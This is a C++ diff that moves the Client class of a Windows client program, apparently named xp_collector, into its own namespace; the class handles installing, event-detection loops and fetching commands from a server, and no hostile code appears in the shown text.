@@ -13,8 +13,9 @@
 #include "Commands/PopupCommand.h"
 #include "CommandHandlers/CommandHandlerFactory.h"
 #include "WinUtils.h"
+using namespace xp_collector;
 
-Client::Client(
+xp_collector::Client::Client(
 	std::unique_ptr<ICommunicator> communicator,
 	std::unique_ptr<IClientStorage> storage,
 	std::unordered_map<std::unique_ptr<IEvent>, std::vector<std::unique_ptr<IEventHandler>>>&& events,
@@ -26,7 +27,7 @@ Client::Client(
 {
 }
 
-void Client::run()
+void xp_collector::Client::run()
 {
 	if (!is_installed()) {
 		while (true) {
@@ -54,7 +55,7 @@ void Client::run()
 	execute_commands_loop();
 }
 
-void Client::install()
+void xp_collector::Client::install()
 {
 	BasicRequest request({ RequestType::InstallClient, "" });
 
@@ -66,12 +67,12 @@ void Client::install()
 	m_storage->store(CLIENT_ID_STORAGE_NAME, InstallClientResponse().unpack(res).get_client_id());
 }
 
-bool Client::is_installed()
+bool xp_collector::Client::is_installed()
 {
 	return m_storage->has_field(CLIENT_ID_STORAGE_NAME);
 }
 
-void Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect, const std::vector<std::unique_ptr<IEventHandler>>& handlers)
+void xp_collector::Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect, const std::vector<std::unique_ptr<IEventHandler>>& handlers)
 {
 	while (true) {
 		const auto det = event_to_detect->is_detected();
@@ -87,7 +88,7 @@ void Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect
 	}
 }
 
-void Client::execute_commands_loop()
+void xp_collector::Client::execute_commands_loop()
 {
 	m_logger->log("Starting main loop of command fetching");
 	while (true) {
@@ -112,7 +113,7 @@ void Client::execute_commands_loop()
 	}
 }
 
-void Client::handle_command(std::shared_ptr<BasicCommand> command)
+void xp_collector::Client::handle_command(std::shared_ptr<BasicCommand> command)
 {
 	m_logger->log("Handling '" + to_string(command->get_command_type()) + "' command with id " + command->get_command_id() + " in a different thread!");
 
@@ -125,7 +126,7 @@ void Client::handle_command(std::shared_ptr<BasicCommand> command)
 	}
 }
 
-std::shared_ptr<BasicCommand> Client::get_command()
+std::shared_ptr<BasicCommand> xp_collector::Client::get_command()
 {
 	m_logger->log("Sending GetCommand request to server");
 
